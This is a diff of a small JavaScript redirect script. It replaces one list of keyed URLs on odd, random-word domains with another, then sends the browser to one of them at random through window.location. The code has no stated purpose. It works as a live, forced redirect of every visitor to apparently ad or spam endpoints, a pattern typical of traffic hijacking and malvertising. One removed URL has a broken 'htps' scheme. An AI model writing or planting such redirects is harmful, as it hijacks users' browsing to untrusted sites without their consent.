@@ -1,23 +1,23 @@
 var dataUrl = [
   
-  'https://themeillogical.com/j1rxj172?key=adc36aa55f17d2c41223d390f5d7be1e',
-  'https://themeillogical.com/xyhh9ebt?key=70bf1cf20c9c44d1a9b9079b1159855b',
-  'https://themeillogical.com/fx19rsb805?key=9a451e61fa6b94f030eb813c38aa046c',
-  'https://themeillogical.com/d33wd6ank?key=115c23b469ea61aa266586a912ebeac6',
-  'https://themeillogical.com/xkd75qyzj?key=da41d9284ef2ccab8959f1b2e47c8fc7',
-  'https://grantedpigsunborn.com/feb7xbxrb?key=4e2587c12cf4b8990532d81ac580ce1f',
-  'https://grantedpigsunborn.com/b9z3pexh7c?key=241a8547e9c0e7911d728d3ad6aac6b4',
-  'https://grantedpigsunborn.com/jg8vjg3xwy?key=edd04c0b0bd41c0bd8494c2890390ad4',
-  'https://grantedpigsunborn.com/mmj2k7nrdt?key=a9adec45b7e8413e8085337ca17f76bf',
-  'https://grantedpigsunborn.com/eun6bc7z?key=7eb35efd04314c17bed2c3b7411852d9',
-  'https://amendablepredicamentvertical.com/ftevmc9ffu?key=88b2c5bdae56a3d0c808da01c98c12d7',
-  'https://amendablepredicamentvertical.com/p9m1gmpd?key=a3e88c6c6c485f3d3b80e2e54d76497a',
-  'https://amendablepredicamentvertical.com/zew272d3wv?key=08a55baa42028feb47832b052f7f041d',
-  'https://amendablepredicamentvertical.com/uhr5mmahw?key=e6341416b270ee9a62e0996299d61fa1',
-  'htps://amendablepredicamentvertical.com/nymnme7td?key=79b78598c8b159605c550bf724e60855'
+  'https://arousedimitateplane.com/eq27arfej?key=67b1fb0cda078a4ea41d8558e49e07d4',
+  'https://arousedimitateplane.com/p1e7i05y?key=70d51c7afe95955a0dc6c6982c478b84',
+  'https://arousedimitateplane.com/d900z8hg?key=d5246e5d9ce8615e9b8c9f6ce7030e07',
+  'https://arousedimitateplane.com/g7ptmy7m?key=04d2117037ee92372bfb48d19d16c4d0',
+  'https://arousedimitateplane.com/tykpbwuirx?key=2bd2cc016f846e31eba9c90b01a4ed2d',
+  'https://www.highperformancegate.com/z1wn7uchfh?key=8e7e9cee0a6e0c3072355923040687d0',
+  'https://www.highperformancegate.com/sjkfhz8m3?key=db7f349f9a05ee1b03fb0c88a9657693',
+  'https://www.highperformancegate.com/w11f6fh2ua?key=aeffd39951a7f32c2bcf38fc8a4ae4d8',
+  'https://www.highperformancegate.com/i95fwhrt?key=58f137185091c64206b110b0aa36ebdf',
+  'https://www.highperformancegate.com/s08bg6xt?key=282003c5c880a35c2edd8003e1d9c33b'
   
+  
+  
+  
+  
+  
+
 ];
 var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
 window.location = randomItem;
-
 
